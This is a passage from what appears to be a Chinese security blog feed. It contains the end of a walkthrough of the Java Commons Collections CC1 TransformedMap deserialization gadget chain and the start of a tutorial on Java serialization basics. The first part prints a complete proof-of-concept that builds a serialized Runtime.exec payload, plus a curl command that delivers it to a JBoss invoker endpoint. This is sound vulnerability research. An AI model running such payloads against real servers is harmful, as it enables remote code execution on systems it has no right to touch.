title="反射调用"></a>反射调用</h3><p>由于<code>AnnotationInvocationHandler</code>是一个内部API专用类，在外部无法通过类名创建出<code>AnnotationInvocationHandler</code>类实例，所以需要通过反射创建<code>AnnotationInvocationHandler</code>对象，并且<code>AnnotationInvocationHandler</code>构造方法接收的第一个参数，需要是一个有属性的注解，如<code>Target.class</code>，而且在传入<code>TransformedMap.decorate</code>方法中的第一个Map参数不可为空且键需要为前者（<code>Target.class</code>）的方法名，否则在<code>AnnotationInvocationHandler.readObject</code>方法中无法通过<code>(memberType != null)</code>这个if判断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.annotation;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key的值需为Target.class中的方法名称，Value的值无所谓</span></span><br><span class="line">m.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">tm</span> <span class="operator">=</span> TransformedMap.decorate(m, <span class="literal">null</span>, tc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射调用AnnotationInvocationHandler类的构造方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">cst</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">cst.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类实例，同时传入注解和tm</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> cst.newInstance(Target.class, tm);</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-transformedmap/10.png"></p><h2 id="0x05-利用代码及漏洞验证"><a href="#0x05-利用代码及漏洞验证" class="headerlink" title="0x05 利用代码及漏洞验证"></a>0x05 利用代码及漏洞验证</h2><p>根据以上所有的结合起来，构造如下的一个最终POC。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    </span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// Key的值需为Target.class中的方法名称，Value的值无所谓</span></span><br><span class="line">        m.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">tm</span> <span class="operator">=</span> TransformedMap.decorate(m, <span class="literal">null</span>, tc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cst</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">        cst.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例，同时传入注解和tm</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> cst.newInstance(Target.class, tm);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化至本地一个文件中</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;src/main/resources/cc1.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，向一个存在反序列化漏洞且JDK版本小于8u71的Jboss环境发送如上生成的恶意序列化数据，效果符合预期，如下图，成功弹出计算器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&quot;</span> --data-binary <span class="string">&quot;@cc1.ser&quot;</span> http://localhost:8080/invoker/readonly</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;JBoss Web/3.0.0-CR2 - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:<span class="comment">#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Exception report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;exception&lt;/b&gt; &lt;pre&gt;java.lang.ClassCastException: sun.reflect.annotation.AnnotationInvocationHandler cannot be cast to org.jboss.invocation.MarshalledInvocation</span></span><br><span class="line">        org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)</span><br><span class="line">&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available <span class="keyword">in</span> the JBoss Web/3.0.0-CR2 logs.&lt;/u&gt;&lt;/p&gt;&lt;HR size=<span class="string">&quot;1&quot;</span> noshade=<span class="string">&quot;noshade&quot;</span>&gt;&lt;h3&gt;JBoss Web/3.0.0-CR2&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-deserialization-cc1-transformedmap/11.png"></p><p>完整Gadget调用链如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">   Map(Proxy).entrySet()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">            TransformedMap.setValue()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li><a href="https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html">https://0xf4n9x.github.io/java-deserialization-vulnerability-principle.html</a></li><li><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478">https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a></li><li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li><li><a href="https://www.javasec.org/javase/JavaDeserialization/Collections.html">https://www.javasec.org/javase/JavaDeserialization/Collections.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞</title>
      <link href="/java-deserialization-vulnerability-principle.html"/>
      <url>/java-deserialization-vulnerability-principle.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80">0x00 序列化与反序列化基础</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">什么是序列化与反序列化</a></li><li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8Java%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0">序列化与反序列化在Java中的实现</a><ul><li><a href="#Java%E5%BA%8F%E5%88%97%E5%8C%96">Java序列化</a></li><li><a href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Java反序列化</a></li><li><a href="#serialVersionUID%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">serialVersionUID版本控制</a></li><li><a href="#%E4%B8%8D%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84">不可序列化的</a></li><li><a href="#Externalizable%E6%8E%A5%E5%8F%A3">Externalizable接口</a></li></ul></li></ul></li><li><a href="#0x01-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F">0x01 Java反序列化漏洞的前世今生</a><ul><li><a href="#%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2">发展历史</a></li><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E6%93%8D%E7%BA%B5">简单的反序列化利用：应用程序逻辑操纵</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%B1%E5%AE%B3%E5%8D%87%E7%BA%A7%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">反序列化危害升级：任意代码执行</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7">反序列化任意代码执行攻击的局限性</a></li></ul></li><li><a href="#0x02-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EKick-off-Gadget">0x02 Java反序列化漏洞Kick-off Gadget</a><ul><li><a href="#%E9%87%8D%E5%86%99readObject%E8%87%B4%E4%BD%BF%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">重写readObject致使任意代码执行</a></li><li><a href="#readObject%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">readObject方法执行过程分析</a></li></ul></li><li><a href="#0x03-URLDNS%E9%93%BE%E5%88%86%E6%9E%90">0x03 URLDNS链分析</a><ul><li><a href="#Sink%EF%BC%9AURL-hashCode">Sink：URL#hashCode</a></li><li><a href="#Kick-off%EF%BC%9AHashMap-readObject">Kick-off：HashMap#readObject</a></li><li><a href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%8F%8A%E9%AA%8C%E8%AF%81">利用代码及验证</a></li><li><a href="#URLDNS%E9%93%BE%E6%80%BB%E7%BB%93">URLDNS链总结</a></li></ul></li><li><a href="#0x04-%E5%8F%82%E8%80%83">0x04 参考</a></li></ul><h2 id="0x00-序列化与反序列化基础"><a href="#0x00-序列化与反序列化基础" class="headerlink" title="0x00 序列化与反序列化基础"></a>0x00 序列化与反序列化基础</h2><h3 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h3><p>序列化是将复杂的数据结构或对象转换为字节序列的过程，以便于在网络上传输、存储或持久化，在序列化过程中，对象的状态被转换成字节流，使得它可以被写入文件或通过网络发送。</p><p>反序列化则是序列化的逆过程，即将序列化后的字节流转换回原始的数据结构或对象，在反序列化过程中，从序列化后的数据中提取出原始对象的状态，并将其重新构建为内存中的对象，这使得数据可以从持久化的状态重新恢复为原始的可操作对象，以便进行进一步的处理或使用。</p><p>这两个过程通常用于在不同系统之间进行数据交换，例如在客户端和服务器之间、不同编程语言之间、或者将对象持久化到数据库或磁盘上。</p><p>常见的序列化有二进制格式的，譬如Java Serialization、Ruby Marshal等；人类可读格式的，如JSON、XML、YAML等；以及混合格式的，如Python pickle、PHP Serialization等。</p><h3 id="序列化与反序列化在Java中的实现"><a href="#序列化与反序列化在Java中的实现" class="headerlink" title="序列化与反序列化在Java中的实现"></a>序列化与反序列化在Java中的实现</h3><h4 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h4><p>在Java中，如果要使一个类可序列化，只需该类实现<code>Serializable</code>接口，<code>Serializable</code>是一个标记接口，不包含任何方法，只是为了表示该类是可序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，使用<code>ObjectOutputStream</code>类可以将对象序列化成字节流，再将字节流保存到文件或通过网络传输。如下将<code>Person</code>对象序列化到<code>person.ser</code>文件中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Martin&quot;</span>, <span class="number">21</span>);</span><br><span class="line">            out.writeObject(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;Person object has been serialized.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对该对象进行序列化时，Java会将对象转换为字节流并以特定的格式进行存储，通过查看<code>person.ser</code>文件的十六进制内容，可以发现Java序列化数据是以<code>aced</code>开头的，Base64编码则是<code>rO0</code>，这也是Java序列化数据的魔术数（Magic Number），用于标识Java序列化的数据。</p><p>在其之后紧跟着的是序列化规范的版本号，例如<code>0005</code>表示Java序列化规范的版本号是5，再之后的内容就是具体的对象数据，包括类名、字段名、字段类型和字段值等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xxd person.ser</span><br><span class="line">00000000: aced 0005 7372 0022 636f 6d2e 6a61 7661  ....sr.<span class="string">&quot;com.java</span></span><br><span class="line"><span class="string">00000010: 7365 632e 6465 7365 7269 616c 697a 6174  sec.deserializat</span></span><br><span class="line"><span class="string">00000020: 696f 6e2e 5065 7273 6f6e 0000 0000 0000  ion.Person......</span></span><br><span class="line"><span class="string">00000030: 0001 0200 0249 0003 6167 654c 0004 6e61  .....I..ageL..na</span></span><br><span class="line"><span class="string">00000040: 6d65 7400 124c 6a61 7661 2f6c 616e 672f  met..Ljava/lang/</span></span><br><span class="line"><span class="string">00000050: 5374 7269 6e67 3b78 7000 0000 1574 0006  String;xp....t..</span></span><br><span class="line"><span class="string">00000060: 4d61 7274 696e                           Martin</span></span><br></pre></td></tr></table></figure><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>而当Java收到序列化数据时，会使用<code>ObjectInputStream</code>类从字节流中反序列化对象。如下从<code>person.ser</code>文件中反序列化<code>Person</code>对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.ser&quot;</span>);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) in.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;Person object has been deserialized.&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Name: &quot;</span> + person.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;Age: &quot;</span> + person.getAge());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，一个简单的序列化与反序列化过程就介绍完毕了。</p><h4 id="serialVersionUID版本控制"><a href="#serialVersionUID版本控制" class="headerlink" title="serialVersionUID版本控制"></a>serialVersionUID版本控制</h4><p>在<code>Serializable</code>接口中，可以定义一个名为<code>serialVersionUID</code>的<code>static final long</code>字段。这个字段是用来控制对象的序列化版本。如果不显式地定义<code>serialVersionUID</code>，Java会自动生成一个，但一旦修改了类的结构，生成的<code>serialVersionUID</code>可能会发生变化，导致旧版本的序列化对象无法被正确反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><h4 id="不可序列化的"><a href="#不可序列化的" class="headerlink" 